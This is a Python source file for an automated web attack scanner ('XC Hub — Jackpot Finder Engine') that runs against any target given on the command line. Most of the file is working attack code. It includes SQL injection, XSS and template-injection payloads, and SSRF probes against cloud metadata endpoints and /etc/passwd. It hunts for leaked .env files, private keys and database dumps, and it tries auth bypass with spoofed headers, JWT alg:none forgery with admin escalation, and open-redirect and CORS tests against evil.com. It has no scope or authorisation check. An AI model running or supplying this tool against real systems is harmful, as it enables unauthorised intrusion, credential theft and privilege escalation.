#!/usr/bin/env python3
"""
XC Hub — Hacking Workspace
hunter.py — JACKPOT FINDER ENGINE v1.0
1 Rule: NO LIMIT COULD HOLD DEV
"""

import sys, os, re, json, time, threading
import requests
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ── Colors ────────────────────────────────────────────────────────
R  = '\033[91m'; Y = '\033[93m'; G = '\033[92m'
C  = '\033[96m'; M = '\033[95m'; B = '\033[94m'
RS = '\033[0m';  BOLD = '\033[1m'

JACKPOT = f"{R}{BOLD}[🎰 JACKPOT]{RS}"
CRIT    = f"{R}{BOLD}[CRITICAL]{RS}"
HIGH    = f"{Y}{BOLD}[HIGH]{RS}"
MED     = f"{M}[MED]{RS}"
LOW     = f"{C}[LOW]{RS}"
INFO    = f"{B}[*]{RS}"
OK      = f"{G}[+]{RS}"
FAIL    = f"{R}[-]{RS}"

findings = []
_lock = threading.Lock()

def log(severity, vuln_type, url, detail, evidence=""):
    entry = {
        "severity": severity,
        "type": vuln_type,
        "url": url,
        "detail": detail,
        "evidence": evidence[:300] if evidence else "",
        "time": datetime.now().isoformat(),
    }
    with _lock:
        findings.append(entry)
        tag = JACKPOT if severity in ("CRITICAL","HIGH") else (MED if severity=="MED" else LOW)
        print(f"\n{tag} [{vuln_type}]")
        print(f"  URL    : {url}")
        print(f"  Detail : {detail}")
        if evidence:
            print(f"  Evidence: {evidence[:160]}")

def banner(target, mode):
    modes = {"full":"🎰 JACKPOT — ALL ANGLES", "vuln":"🎯 VULN — TARGETED HUNT", "warm":"🌊 WARM-UP — RECON"}
    print(f"""
{R}{BOLD}╔══════════════════════════════════════════════╗
║  XC HUB — HACKING WORKSPACE                 ║
║  JACKPOT FINDER ENGINE v1.0 🔥               ║
║  1 RULE: NO LIMIT COULD HOLD DEV            ║
╚══════════════════════════════════════════════╝{RS}
  Target : {C}{target}{RS}
  Mode   : {R}{BOLD}{modes.get(mode,'JACKPOT')}{RS}
  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")

def make_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    })
    s.verify = False
    return s

# ══════════════════════════════════════════════════════════════════
#  PHASE 1 — SECURITY HEADERS + TECH FINGERPRINT
# ══════════════════════════════════════════════════════════════════
SECURITY_HEADERS = [
    "X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy",
    "Strict-Transport-Security", "X-XSS-Protection",
    "Referrer-Policy", "Permissions-Policy",
]

def check_headers(session, url):
    print(f"\n{INFO} Phase 1: Security headers + fingerprint")
    try:
        r = session.get(url, timeout=10, allow_redirects=True)
        missing = [h for h in SECURITY_HEADERS
                   if h.lower() not in {k.lower() for k in r.headers}]
        if missing:
            log("LOW", "MISSING_SECURITY_HEADERS", url,
                f"Missing: {', '.join(missing)}")
        for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
            v = r.headers.get(h, "")
            if v:
                log("LOW", "TECH_LEAK", url, f"{h}: {v}")
        # CORS wildcard
        cors = r.headers.get("Access-Control-Allow-Origin", "")
        if cors == "*":
            log("MED", "CORS_WILDCARD", url, "Access-Control-Allow-Origin: *")
        return r
    except Exception as e:
        print(f"  {FAIL} headers: {e}")
        return None

# ══════════════════════════════════════════════════════════════════
#  PHASE 2 — JUICY FILES
# ══════════════════════════════════════════════════════════════════
JUICY = [
    # Config leaks
    ".env", ".env.local", ".env.production", ".env.backup",
    "config.php", "wp-config.php", "config.yml", "config.yaml",
    "database.yml", "settings.py", "local_settings.py",
    "application.properties", "appsettings.json",
    # Git / VCS
    ".git/config", ".git/HEAD", ".git/COMMIT_EDITMSG",
    ".svn/entries", ".hg/hgrc",
    # Creds / Keys
    ".htpasswd", "id_rsa", "id_rsa.pub", "server.key",
    "server.crt", "ssl.key", "private.key",
    # Backups
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql",
    "db.sql", "database.sql", "site.zip", "www.zip",
    # Admin / Debug
    "admin/", "administrator/", "phpmyadmin/", "pma/",
    "phpinfo.php", "info.php", "test.php", "debug.php",
    "console", "rails/info/properties",
    # API Docs
    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
    "api-docs", "api/swagger", "v1/api-docs", "v2/api-docs",
    "graphql", "graphiql",
    # Actuator / Monitoring
    "actuator", "actuator/env", "actuator/health",
    "actuator/mappings", "actuator/beans",
    "metrics", "health", "status",
    # Misc
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "package.json", "composer.json", "Gemfile",
    "web.config", "nginx.conf", ".DS_Store",
    ".well-known/security.txt",
]

def check_juicy(session, base, threads=30):
    print(f"\n{INFO} Phase 2: Juicy file hunt ({len(JUICY)} paths)...")
    hits = []

    def probe(path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        try:
            r = session.get(url, timeout=7, allow_redirects=False)
            if r.status_code in (200, 301, 302, 403):
                sev = (
                    "CRITICAL" if any(x in path for x in
                        [".env", "id_rsa", "db.sql", "backup", "config.php", "wp-config", ".git/config", "private.key"])
                    else "HIGH" if any(x in path for x in
                        [".git", "phpinfo", "admin", "graphql", "swagger", "actuator", "phpmyadmin"])
                    else "MED"
                )
                snippet = r.text[:300] if r.status_code == 200 else ""
                log(sev, "JUICY_FILE", url, f"HTTP {r.status_code} → {path}", snippet)
                hits.append(url)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(probe, JUICY))
    return hits

# ══════════════════════════════════════════════════════════════════
#  PHASE 3 — SQL INJECTION
# ══════════════════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "1' AND SLEEP(5)--", '1" AND SLEEP(5)--',
    "1; SELECT SLEEP(5)--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' ORDER BY 1--", "' ORDER BY 100--",
    "AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=1--", "' AND 1=2--",
    "0 OR 1=1", "0' OR '1'='1",
    "%27 OR %271%27=%271",
]
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "mysql_result", "ora-",
    "pg_query", "sqlite_", "syntax error", "odbc driver",
    "microsoft sql", "unclosed quotation", "division by zero",
    "you have an error in your sql", "warning: mysql",
    "jdbc", "sqlstate", "native client", "sqlexception",
    "com.mysql.jdbc", "org.hibernate",
]

def test_sqli(session, base_url, param, value="1"):
    for payload in SQLI_PAYLOADS:
        try:
            url = base_url + ("&" if "?" in base_url else "?") + f"{param}={quote(str(payload))}"
            t0 = time.time()
            r = session.get(url, timeout=12)
            elapsed = time.time() - t0
            body = r.text.lower()
            for err in SQLI_ERRORS:
                if err in body:
                    idx = body.find(err)
                    log("CRITICAL", "SQL_INJECTION", url,
                        f"Param: {param} | Error: '{err}' found",
                        r.text[max(0,idx-60):idx+120])
                    return True
            if ("SLEEP" in payload or "sleep" in payload) and elapsed > 4.5:
                log("CRITICAL", "SQLI_TIME_BASED", url,
                    f"Param: {param} | Payload: {payload} | Delay: {elapsed:.2f}s")
                return True
        except Exception:
            pass
    return False

# ══════════════════════════════════════════════════════════════════
#  PHASE 4 — XSS + TEMPLATE INJECTION
# ══════════════════════════════════════════════════════════════════
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    "javascript:alert(1)",
    '{{7*7}}', '${7*7}', '<%= 7*7 %>',
    '#{7*7}', '*{7*7}',
]

def test_xss(session, base_url, param):
    for payload in XSS_PAYLOADS:
        try:
            url = base_url + ("&" if "?" in base_url else "?") + f"{param}={quote(payload)}"
            r = session.get(url, timeout=8)
            if payload in r.text:
                log("HIGH", "XSS_REFLECTED", url,
                    f"Param: {param} | Payload reflected",
                    r.text[:300])
                return True
            if payload == '{{7*7}}' and '49' in r.text:
                log("CRITICAL", "SSTI", url,
                    f"Param: {param} | {{{{7*7}}}} → 49 (Server-Side Template Injection!)")
                return True
            if payload == '${7*7}' and '49' in r.text:
                log("CRITICAL", "SSTI", url,
                    f"Param: {param} | ${{7*7}} → 49 (SSTI!)")
                return True
        except Exception:
            pass
    return False

# ══════════════════════════════════════════════════════════════════
#  PHASE 5 — IDOR
# ══════════════════════════════════════════════════════════════════
IDOR_PATTERNS = [
    r'/users?/(\d+)', r'/accounts?/(\d+)', r'/profiles?/(\d+)',
    r'/orders?/(\d+)', r'/invoices?/(\d+)', r'/tickets?/(\d+)',
    r'/docs?/(\d+)', r'/files?/(\d+)', r'/posts?/(\d+)',
    r'[?&]id=(\d+)', r'[?&]user_id=(\d+)', r'[?&]account_id=(\d+)',
    r'[?&]order_id=(\d+)', r'[?&]doc_id=(\d+)', r'[?&]uid=(\d+)',
]

def check_idor(session, url):
    for pattern in IDOR_PATTERNS:
        m = re.search(pattern, url)
        if not m:
            continue
        orig_id = int(m.group(1))
        try:
            r_orig = session.get(url, timeout=8)
            orig_len = len(r_orig.text)
        except Exception:
            continue
        for test_id in [orig_id + 1, orig_id - 1, 1, 2, 100]:
            if test_id <= 0:
                continue
            test_url = url[:m.start(1)] + str(test_id) + url[m.end(1):]
            try:
                r = session.get(test_url, timeout=8)
                if r.status_code == 200 and len(r.text) > 100 and abs(len(r.text) - orig_len) < orig_len * 0.5:
                    log("HIGH", "IDOR_CANDIDATE", test_url,
                        f"ID {orig_id} → {test_id} returned 200 ({len(r.text)} bytes)")
            except Exception:
                pass

# ══════════════════════════════════════════════════════════════════
#  PHASE 6 — OPEN REDIRECT
# ══════════════════════════════════════════════════════════════════
REDIRECT_PARAMS = [
    "url","redirect","redirect_to","return","return_to",
    "next","goto","target","dest","destination","rurl","r","ref",
]
REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "///evil.com",
    "https:evil.com", r"\/\/evil.com",
    "\thttps://evil.com", "https://evil.com%23trusted.com",
]

def check_open_redirect(session, url):
    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS:
            try:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={quote(payload)}"
                r = session.get(test_url, timeout=7, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "evil.com" in loc or loc.startswith("//evil"):
                    log("MED", "OPEN_REDIRECT", test_url,
                        f"Param: {param} → Location: {loc}")
                    break
            except Exception:
                pass

# ══════════════════════════════════════════════════════════════════
#  PHASE 7 — SSRF
# ══════════════════════════════════════════════════════════════════
SSRF_PARAMS = [
    "url","uri","path","src","source","dest","data",
    "host","site","html","fetch","load","proxy","image","img",
    "link","redirect","callback","webhook",
]
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.1.1/",
    "file:///etc/passwd",
    "http://localhost/",
    "http://0.0.0.0:22",
    "dict://localhost:6379/info",
    "gopher://localhost:6379/_PING",
]
SSRF_HITS = [
    "ami-id","instance-id","root:","computeMetadata",
    "iam/security","internal","localhost",
    "private_key","secret",
]

def check_ssrf(session, url):
    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS:
            try:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={quote(payload)}"
                r = session.get(test_url, timeout=6)
                body = r.text.lower()
                for hit in SSRF_HITS:
                    if hit in body:
                        log("CRITICAL", "SSRF", test_url,
                            f"Param: {param} | Payload: {payload} | Hit: '{hit}'",
                            r.text[:300])
                        break
            except Exception:
                pass

# ══════════════════════════════════════════════════════════════════
#  PHASE 8 — AUTH BYPASS
# ══════════════════════════════════════════════════════════════════
AUTH_PATHS = [
    "/admin", "/admin/", "/admin/dashboard", "/admin/users",
    "/admin/config", "/admin/settings",
    "/api/admin", "/api/internal", "/internal/",
    "/manage", "/management", "/console", "/superuser",
    "/api/v1/admin", "/api/v2/admin",
]
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "null"},
    {"X-Auth-Token": "admin"},
]
PATH_BYPASS_SUFFIXES = [
    "..;/", "//", "%2f", ";/", "%09", "?", "#",
    "/..;", "/..", "..%2f",
]

def check_auth_bypass(session, base):
    print(f"\n{INFO} Phase 8: Auth bypass...")
    for path in AUTH_PATHS:
        url = base.rstrip('/') + path
        try:
            r_normal = session.get(url, timeout=8, allow_redirects=False)
            if r_normal.status_code not in (401, 403):
                continue
            # Header bypass
            for hdrs in BYPASS_HEADERS:
                try:
                    r = session.get(url, headers=hdrs, timeout=7)
                    if r.status_code == 200 and len(r.text) > 50:
                        log("CRITICAL", "AUTH_BYPASS_HEADER", url,
                            f"Header: {list(hdrs.items())[0]} → 200 OK",
                            r.text[:200])
                        break
                except Exception:
                    pass
            # Path traversal bypass
            for sfx in PATH_BYPASS_SUFFIXES:
                try:
                    bypass_url = base.rstrip('/') + path + sfx
                    r = session.get(bypass_url, timeout=7, allow_redirects=False)
                    if r.status_code == 200:
                        log("HIGH", "AUTH_BYPASS_PATH", bypass_url,
                            f"Path bypass: {path + sfx}")
                except Exception:
                    pass
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════
#  PHASE 9 — CORS MISCONFIGURATION
# ══════════════════════════════════════════════════════════════════
def check_cors(session, url):
    print(f"\n{INFO} Phase 9: CORS misconfiguration...")
    evil_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{urlparse(url).hostname}",
    ]
    for origin in evil_origins:
        try:
            r = session.get(url, headers={"Origin": origin}, timeout=8)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == origin or acao == "*":
                severity = "HIGH" if acac.lower() == "true" else "MED"
                log(severity, "CORS_MISCONFIG", url,
                    f"Origin: {origin} → ACAO: {acao} | Credentials: {acac}")
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════
#  PHASE 10 — JWT NONE ALG + WEAK SECRET
# ══════════════════════════════════════════════════════════════════
import base64

def check_jwt(token_str, url, session):
    parts = token_str.split('.')
    if len(parts) != 3:
        return
    try:
        def pad(s): return s + '=' * (-len(s) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])).decode())
        payload_data = json.loads(base64.urlsafe_b64decode(pad(parts[1])).decode())
    except Exception:
        return

    # Test alg:none
    none_header = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()

    # Escalate payload: try to set admin/role/is_admin
    test_payload = dict(payload_data)
    for k in ["role","is_admin","admin","type","permission","level"]:
        if k in test_payload:
            test_payload[k] = "admin" if isinstance(test_payload[k], str) else True

    enc_payload = base64.urlsafe_b64encode(
        json.dumps(test_payload).encode()
    ).rstrip(b'=').decode()

    none_token = f"{none_header}.{enc_payload}."
    try:
        r = session.get(url, headers={"Authorization": f"Bearer {none_token}"}, timeout=8)
        if r.status_code == 200:
            log("CRITICAL", "JWT_ALG_NONE", url,
                f"alg:none accepted! Payload: {test_payload}",
                r.text[:200])
    except Exception:
        pass

def extract_and_check_jwt(session, url, response_text):
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
    tokens = re.findall(jwt_pattern, response_text)
    for tok in tokens:
        check_jwt(tok, url, session)

# ══════════════════════════════════════════════════════════════════
#  PHASE 11 — RATE LIMIT & MASS ASSIGNMENT CHECK
# ══════════════════════════════════════════════════════════════════
def check_rate_limit(session, url):
    responses = []
    for _ in range(15):
        try:
            r = session.get(url, timeout=5)
            responses.append(r.status_code)
        except Exception:
            pass
    rate_limited = any(c in responses for c in [429, 503])
    if not rate_limited:
        log("MED", "NO_RATE_LIMIT", url,
            f"15 rapid requests — no 429/503 detected. Potential brute-force vector.")

# ══════════════════════════════════════════════════════════════════
#  PARAM FUZZ — runs SQLi + XSS + SSRF on every discovered param
# ══════════════════════════════════════════════════════════════════
def fuzz_url(session, url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return
    base = url.split('?')[0]
    print(f"\n{INFO} Fuzzing {len(params)} param(s) on {base}")
    for param in params:
        test_sqli(session, base, param)
        test_xss(session, base, param)
    check_open_redirect(session, url)
    check_ssrf(session, url)
    check_idor(session, url)

def discover_urls_from_page(session, base, response_text):
    """Extract URLs with params from page source for further fuzzing."""
    host = urlparse(base).hostname
    found = []
    patterns = [
        r'href=["\']([^"\']+)["\']',
        r'action=["\']([^"\']+)["\']',
        r'src=["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        for m in re.findall(pat, response_text):
            if '?' in m:
                if m.startswith('http'):
                    if host in m:
                        found.append(m)
                else:
                    found.append(base.rstrip('/') + '/' + m.lstrip('/'))
    return list(set(found))[:30]

# ══════════════════════════════════════════════════════════════════
#  MAIN MODES
# ══════════════════════════════════════════════════════════════════
def mode_warm(target, session):
    """Surface recon — info gathering, quick wins."""
    print(f"\n{C}[ WARM-UP MODE — Surface Recon ]{RS}")
    r = check_headers(session, target)
    check_juicy(session, target, threads=20)
    if r:
        check_cors(session, target)

def mode_vuln(target, session):
    """Targeted vuln hunt — medium depth."""
    print(f"\n{Y}[ VULN MODE — Targeted Hunt ]{RS}")
    r = check_headers(session, target)
    check_juicy(session, target, threads=25)
    check_auth_bypass(session, target)
    check_cors(session, target)
    if r:
        fuzz_url(session, target)
        discovered = discover_urls_from_page(session, target, r.text)
        for u in discovered[:10]:
            fuzz_url(session, u)

def mode_jackpot(target, session):
    """Full black-box — all angles, find biggest vuln."""
    print(f"\n{R}{BOLD}[ JACKPOT MODE — ALL ANGLES 🎰 ]{RS}")

    # Phase 1: Headers + Fingerprint
    r = check_headers(session, target)

    # Phase 2: Juicy files
    check_juicy(session, target, threads=30)

    # Phase 3-4: Direct URL param fuzz
    fuzz_url(session, target)

    # Phase 5: Auth bypass
    check_auth_bypass(session, target)

    # Phase 6: CORS
    check_cors(session, target)

    # Phase 7: Rate limit on base URL
    check_rate_limit(session, target)

    # Discover + fuzz all URLs from page
    if r:
        extract_and_check_jwt(session, target, r.text)
        discovered = discover_urls_from_page(session, target, r.text)
        print(f"\n{INFO} Discovered {len(discovered)} URLs with params — fuzzing...")
        for u in discovered:
            fuzz_url(session, u)
            check_idor(session, u)

    # robots.txt + sitemap endpoint discovery
    for disc_path in ["/robots.txt", "/sitemap.xml"]:
        try:
            r2 = session.get(target.rstrip('/') + disc_path, timeout=8)
            if r2.status_code == 200:
                extra = re.findall(r'https?://[^\s<>"]+|/[a-zA-Z0-9_\-./]+\?[^\s<>"]+', r2.text)
                host = urlparse(target).hostname
                for u in extra[:20]:
                    if host in u or u.startswith('/'):
                        full = u if u.startswith('http') else target.rstrip('/') + u
                        fuzz_url(session, full)
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════
#  REPORT
# ══════════════════════════════════════════════════════════════════
def save_report(target, elapsed):
    by_sev = {"CRITICAL":[], "HIGH":[], "MED":[], "LOW":[]}
    for f in findings:
        s = f["severity"]
        if s in by_sev: by_sev[s].append(f)

    total = len(findings)
    print(f"""
{R}{BOLD}╔══════════════════════════════════════════════╗
║  🎰 JACKPOT REPORT                           ║
╚══════════════════════════════════════════════╝{RS}
  Target   : {C}{target}{RS}
  Findings : {BOLD}{total}{RS}
  Critical : {R}{len(by_sev['CRITICAL'])}{RS}
  High     : {Y}{len(by_sev['HIGH'])}{RS}
  Medium   : {M}{len(by_sev['MED'])}{RS}
  Low      : {C}{len(by_sev['LOW'])}{RS}
  Time     : {elapsed:.1f}s
""")

    if by_sev["CRITICAL"]:
        print(f"{JACKPOT} CRITICAL FINDINGS 🔥")
        for f in by_sev["CRITICAL"]:
            print(f"  → [{f['type']}] {f['url']}")
            print(f"     {f['detail']}")
    if by_sev["HIGH"]:
        print(f"\n{HIGH} HIGH FINDINGS")
        for f in by_sev["HIGH"]:
            print(f"  → [{f['type']}] {f['url']}")
            print(f"     {f['detail']}")

    # Append to findings.md
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "findings.md")
    with open(out_path, "a", encoding="utf-8") as fp:
        fp.write(f"\n\n---\n\n## {target} · {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        fp.write(f"**Total:** {total} findings &nbsp;|&nbsp; ")
        fp.write(f"{len(by_sev['CRITICAL'])} Critical &nbsp;·&nbsp; ")
        fp.write(f"{len(by_sev['HIGH'])} High &nbsp;·&nbsp; ")
        fp.write(f"{len(by_sev['MED'])} Medium &nbsp;·&nbsp; ")
        fp.write(f"{len(by_sev['LOW'])} Low\n\n")
        for sev in ["CRITICAL","HIGH","MED","LOW"]:
            if not by_sev[sev]: continue
            emoji = {"CRITICAL":"🔴","HIGH":"🟠","MED":"🟡","LOW":"🔵"}[sev]
            fp.write(f"### {emoji} {sev}\n\n")
            for f in by_sev[sev]:
                fp.write(f"- **[{f['type']}]** `{f['url']}`\n  - {f['detail']}\n")
                if f.get("evidence"):
                    fp.write(f"  - Evidence: `{f['evidence'][:200]}`\n")
            fp.write("\n")
    print(f"\n{OK} Report saved → bugbounty/findings.md")
    return findings

# ══════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════
def run(target, mode="full"):
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if not target.startswith("http"):
        target = "https://" + target

    banner(target, mode)
    session = make_session()
    t0 = time.time()

    if mode == "warm":
        mode_warm(target, session)
    elif mode == "vuln":
        mode_vuln(target, session)
    else:
        mode_jackpot(target, session)

    return save_report(target, time.time() - t0)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"""
{R}{BOLD}XC Hub — Jackpot Finder Engine{RS}

Usage:
  python hunter.py <target>              → /F  — JACKPOT full scan
  python hunter.py <target> vuln         → /F Vul — targeted hunt
  python hunter.py <target> warm         → /WP — surface recon

Examples:
  python hunter.py target.com
  python hunter.py https://target.com vuln
  python hunter.py target.com warm
""")
        sys.exit(1)

    target = sys.argv[1]
    mode   = sys.argv[2] if len(sys.argv) > 2 else "full"
    run(target, mode)
